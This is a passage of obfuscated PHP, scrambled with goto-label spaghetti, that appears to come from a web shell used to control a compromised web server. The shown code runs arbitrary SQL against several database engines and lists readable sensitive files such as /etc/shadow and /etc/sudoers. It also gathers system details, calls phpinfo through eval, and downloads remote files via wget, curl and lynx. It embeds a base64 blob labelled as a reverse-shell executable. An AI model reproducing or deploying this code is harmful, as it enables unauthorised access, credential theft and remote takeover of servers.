trim($p['dbLimit']) : 100; goto l7QiK; EASAP: } goto M4OXO; cLVVN: foreach ($querys as $query) { if (trim($query) != "") { $query_query = sql_query($type, $query, $con); if ($query_query != false) { goto jKZY_; o_Nmr: if (!empty($pagination)) { $res .= "<p>" . $pagination . "</p>"; } goto crQ5Z; jKZY_: $res .= "<p>" . html_safe($query) . ";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>"; goto o_Nmr; crQ5Z: if (!is_bool($query_query)) { goto qCjZc; wTaFA: while ($rows = sql_fetch_data($type, $query_query)) { $res .= "<tr>"; foreach ($rows as $r) { if (empty($r)) { $r = " "; } $res .= "<td>" . html_safe($r) . "</td>"; } $res .= "</tr>"; } goto Ee6Nh; Ee6Nh: $res .= "</table>"; goto EzUJt; qCjZc: $res .= "<table class='border dataView sortable tblResult'><tr>"; goto hqduH; WBHRl: $res .= "</tr>"; goto wTaFA; hqduH: for ($i = 0; $i < sql_num_fields($type, $query_query); $i++) { $res .= "<th>" . html_safe(sql_field_name($type, $query_query, $i)) . "</th>"; } goto WBHRl; EzUJt: } goto WC8t7; WC8t7: } else { $res .= "<p>" . html_safe($query) . ";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>"; } } } goto y7A1O; y7A1O: } else { if ($type != 'pdo' && $type != 'odbc') { goto U_SBR; U_SBR: if ($type == 'mysql') { $showdb = "SHOW DATABASES"; } elseif ($type == 'mssql') { $showdb = "SELECT name FROM master..sysdatabases"; } elseif ($type == 'pgsql') { $showdb = "SELECT schema_name FROM information_schema.schemata"; } elseif ($type == 'oracle') { $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME"; } elseif ($type == 'sqlite3' || $type == 'sqlite') { $showdb = "SELECT \"" . $host . "\""; } else { $showdb = "SHOW DATABASES"; } goto GcjlR; cmmQc: if ($query_db != false) { while ($db_arr = sql_fetch_data($type, $query_db)) { foreach ($db_arr as $db) { goto RGh63; vZP9M: if ($query_table != false) { while ($tables_arr = sql_fetch_data($type, $query_table)) { foreach ($tables_arr as $table) { $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>" . $table . "</td></tr>"; } } } goto rc8hp; rc8hp: $res .= "</table>"; goto E1x6t; G9dKs: $query_table = sql_query($type, $showtbl, $con); goto vZP9M; RGh63: if ($type == 'mysql') { $showtbl = "SHOW TABLES FROM " . $db; } elseif ($type == 'mssql') { $showtbl = "SELECT name FROM " . $db . "..sysobjects WHERE xtype = 'U'"; } elseif ($type == 'pgsql') { $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='" . $db . "'"; } elseif ($type == 'oracle') { $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='" . $db . "'"; } elseif ($type == 'sqlite3' || $type == 'sqlite') { $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; } else { $showtbl = ""; } goto t51h6; t51h6: $res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>" . $db . "</p><table class='border' style='display:none;margin:8px 0;'>"; goto G9dKs; E1x6t: } } } goto pF7ov; GcjlR: $query_db = sql_query($type, $showdb, $con); goto cmmQc; pF7ov: } } } goto VDGsK; SZmIR: $con = sql_connect($type, $host, $user, $pass); goto sNVb3; nUEDx: $type = $p['dbType']; goto XXGnZ; XXGnZ: $host = $p['dbHost']; goto WgS4r; WgS4r: $user = $p['dbUser']; goto EmQGJ; ZrKJo: $port = $p['dbPort']; goto SZmIR; IdwS2: output('error'); goto vBAgt; EmQGJ: $pass = $p['dbPass']; goto ZrKJo; sNVb3: $res = ""; goto mby7i; vBAgt: } goto XBdfd; p8wIF: if (!function_exists('info_getinfo')) { function info_getinfo() { goto UPQOy; KqZa7: foreach ($phpinfo as $p => $i) { goto PbEQo; Em6_6: eval("phpinfo(" . $i . ");"); goto aoi73; jsMYI: ob_end_clean(); goto HrsqM; PbEQo: $res .= "<p class='boxtitle' onclick=\"info_toggle('" . $i . "');\" style='margin-bottom:8px;'>" . $p . "</p>"; goto XrBnU; HrsqM: if (preg_match("/<body>(.*?)<\\/body>/is", $b, $r)) { goto p6Ynf; iyp37: $body = preg_replace("/<tr class=\"h\">(.*?)<\\/tr>/", "", $body); goto LufKc; LufKc: $body = preg_replace("/<a href=\"http:\\/\\/www.php.net\\/(.*?)<\\/a>/", "", $body); goto gHgxp; NnY0m: $body = str_replace("<table", "<table class='boxtbl' ", $body); goto iyp37; p6Ynf: $body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]); goto NnY0m; FHjVX: $res .= "<div class='info' id='" . $i . "' style='margin-bottom:8px;display:none;'>" . $body . "</div>"; goto gj2a7; gHgxp: $body = preg_replace("/<a href=\"http:\\/\\/www.zend.com\\/(.*?)<\\/a>/", "", $body); goto FHjVX; gj2a7: } goto FObu0; aoi73: $b = ob_get_contents(); goto jsMYI; XrBnU: ob_start(); goto Em6_6; FObu0: } goto T1q96; wNQh5: return $res; goto Waove; rB2Lo: if (is_win()) { foreach (range("A", "Z") as $letter) { if (is_readable($letter . ":\\")) { $drive = $letter . ":"; $res .= "<tr><td>drive " . $drive . "</td><td>" . format_bit(@disk_free_space($drive)) . " free of " . format_bit(@disk_total_space($drive)) . "</td></tr>"; } } } else { $res .= "<tr><td>root partition</td><td>" . format_bit(@disk_free_space("/")) . " free of " . format_bit(@disk_total_space("/")) . "</td></tr>"; } goto nwQLm; nueGc: $res .= "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>"; goto rB2Lo; ZWJY7: if (!is_win()) { $interesting = array("/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases", "/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf", "/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf", "/etc/ssh/sshd_config", "/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf", "/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"); foreach ($interesting as $f) { if (@is_file($f) && @is_readable($f)) { $res .= "<tr><td>" . $f . "</td><td><a data-path='" . html_safe($f) . "' onclick='view_entry(this);'>" . $f . " is readable</a></td></tr>"; } } } goto gfe00; Xy3NI: $access = array("python" => "python -V", "perl" => "perl -e \"print \$]\"", "python" => "python -V", "ruby" => "ruby -v", "node" => "node -v", "nodejs" => "nodejs -v", "gcc" => "gcc -dumpversion", "java" => "java -version", "javac" => "javac -version"); goto dS95k; gfe00: $res .= "</table></div>"; goto YcR05; dS95k: foreach ($access as $k => $v) { goto rIlBZ; krchL: $res .= "<tr><td>" . $k . "</td><td>" . $version . "</td></tr>"; goto VK5kT; rIlBZ: $version = execute($v); goto N4qZN; VInYO: if ($version[0]) { $version = $version[0]; } else { $version = "?"; } goto krchL; N4qZN: $version = explode("\n", $version); goto VInYO; VK5kT: } goto ZWJY7; AOfFh: $res .= "<p class='boxtitle' onclick=\"info_toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>"; goto nueGc; T1q96: $res .= "<span class='button colSpan' onclick=\"info_refresh();\" style='margin-bottom:8px;'>refresh</span><div style='clear:both;'></div>"; goto wNQh5; UPQOy: $res = ""; goto AOfFh; nwQLm: $res .= "<tr><td>php</td><td>" . phpversion() . "</td></tr>"; goto Xy3NI; YcR05: if (!is_win()) { goto pkqLF; pkqLF: if ($i_buff = trim(read_file("/proc/cpuinfo"))) { goto yyEsW; yyEsW: $res .= "<p class='boxtitle' onclick=\"info_toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>"; goto s3_H2; pbwnE: $i_buffs = explode("\n\n", $i_buff); goto W3eoU; glcrm: $res .= "</div>"; goto BfGA9; W3eoU: foreach ($i_buffs as $i_buffss) { $i_buffss = trim($i_buffss); if ($i_buffss != "") { goto M3kCD; M3kCD: $i_buffsss = explode("\n", $i_buffss); goto AdJ7y; BfdZ9: $res .= "</table>"; goto cKX9p; AdJ7y: $res .= "<table class='dataView'>"; goto VP0Cw; VP0Cw: foreach ($i_buffsss as $i) { $i = trim($i); if ($i != "") { $ii = explode(":", $i); if (count($ii) == 2) { $res .= "<tr><td>" . $ii[0] . "</td><td>" . $ii[1] . "</td></tr>"; } } } goto BfdZ9; cKX9p: } } goto glcrm; s3_H2: $res .= "<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>"; goto pbwnE; BfGA9: } goto CsP1l; fZ7Y4: if ($i_buff = trim(read_file("/proc/partitions"))) { goto kEKOn; Eh2FE: $res .= "</table>"; goto i7IHj; MkfNQ: $res .= "</tr>"; goto CFr6i; nbgUz: foreach ($i_buffss as $i_b) { goto QAh8f; M3n4w: $res .= "</tr>"; goto WErSz; Yst9h: foreach ($i_row as $r) { $res .= "<td style='text-align:center;'>" . $r . "</td>"; } goto M3n4w; HryKj: $res .= "<tr>"; goto Yst9h; QAh8f: $i_row = explode(" ", trim($i_b)); goto HryKj; WErSz: } goto Eh2FE; Qb_vL: $res .= "<table class='dataView'><tr>"; goto Vb5dK; mHj9_: $i_buffs = explode("\n\n", $i_buff); goto Qb_vL; Vb5dK: $i_head = explode(" ", $i_buffs[0]); goto R52r5; CFr6i: $i_buffss = explode("\n", $i_buffs[1]); goto nbgUz; kEKOn: $i_buff = preg_replace("/\\ +/", " ", $i_buff); goto R6y2f; R52r5: foreach ($i_head as $h) { $res .= "<th>" . $h . "</th>"; } goto MkfNQ; R6y2f: $res .= "<p class='boxtitle' onclick=\"info_toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>"; goto EtWmJ; i7IHj: $res .= "</div>"; goto Todav; EtWmJ: $res .= "<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>"; goto mHj9_; Todav: } goto vz13m; CsP1l: if ($i_buff = trim(read_file("/proc/meminfo"))) { goto gKe4u; LJHh_: $res .= "</table></div>"; goto MZgOh; dxv3b: foreach ($i_buffs as $i) { $i = trim($i); if ($i != "") { $ii = explode(":", $i); if (count($ii) == 2) { $res .= "<tr><td>" . $ii[0] . "</td><td>" . $ii[1] . "</td></tr>"; } } else { $res .= "</table><table class='dataView'>"; } } goto LJHh_; XjlrM: $res .= "<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>"; goto dxv3b; gKe4u: $res .= "<p class='boxtitle' onclick=\"info_toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>"; goto N95Fa; N95Fa: $i_buffs = explode("\n", $i_buff); goto XjlrM; MZgOh: } goto fZ7Y4; vz13m: } goto aSns9; aSns9: $phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES); goto KqZa7; Waove: } } goto UwMw1; sWBpT: foreach (get_server_info() as $k => $v) { echo "<div>" . $v . "</div>"; } goto mp55G; paycy: if (!function_exists('download')) { function download($url, $saveas) { goto Dg0Ld; CeMCI: if (is_file($saveas)) { return true; } goto ruuQ2; ncOG1: $buff = execute("lwp-download " . $url . " " . $saveas); goto ljwPn; ljwPn: if (is_file($saveas)) { return true; } goto g93u3; QM7iR: if ($content = read_file($url)) { if (is_file($saveas)) { unlink($saveas); } if (write_file($saveas, $content)) { return true; } } goto hQFsA; EnUEN: $buff = execute("curl " . $url . " -o " . $saveas); goto bWQHR; bWQHR: if (is_file($saveas)) { return true; } goto ncOG1; Dg0Ld: if (!preg_match("/[a-z]+:\\/\\/.+/", $url)) { return false; } goto pWJgl; ruuQ2: return false; goto R2g6o; pWJgl: $filename = basename($url); goto QM7iR; K9Fvl: if (is_file($saveas)) { return true; } goto EnUEN; hQFsA: $buff = execute("wget " . $url . " -O " . $saveas); goto K9Fvl; g93u3: $buff = execute("lynx -source " . $url . " > " . $saveas); goto CeMCI; R2g6o: } } goto hDK6D; Toz63: @ini_set('html_errors', '0'); goto ubv7w; nqPvS: $nav = get_nav(get_cwd()); goto y90hX; Wy8A9: $GLOBALS['resources']['rs_executable'] = "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"; goto qZp7U; Uzav2: $GLOBALS['module']['database']['content'] = "\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='3'><p class='boxtitle'>Connect</p></th></tr>\n</thead>\n<tbody>\n\t<tr class='dbHostRow'><td style='width:144px' class='dbHostLbl'>Host</td><td colspan='2'><input type='text' id='dbHost' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>\n\t<tr class='dbUserRow'><td>Username</td><td colspan='2'><input type='text' id='dbUser' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>\n\t<tr class='dbPassRow'><td>Password</td><td colspan='2'><input type='text' id='dbPass' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>\n\t<tr class='dbPortRow'><td>Port (Optional)</td><td colspan='2'><input type='text' id='dbPort' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>\n</tbody>\n<tfoot>\n\t<tr class='dbConnectRow'>\n\t\t<td style='width:144px;'>\n\t\t\t<select id='dbType'>\n\t\t\t</select>\n\t\t</td>\n\t\t<td style='width:120px;'><span class='button' onclick=\"db_connect();\">connect</span></td>\n\t\t<td class='dbError'></td>\n\t</tr>\n\t<tr class='dbQueryRow' style='display:none;'>\n\t\t<td colspan='3'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td>\n\t</tr>\n\t<tr class='dbQueryRow' style='display:none;'>\n\t\t<td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td>\n\t\t<td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td>\n\t\t<td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td>\n\t</tr>\n</tfoot>\n</table>\n<div id='dbBottom' style='display:none;'>\n<br>\n<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>\n</div>\n"; goto QklNo; ApASn: die;

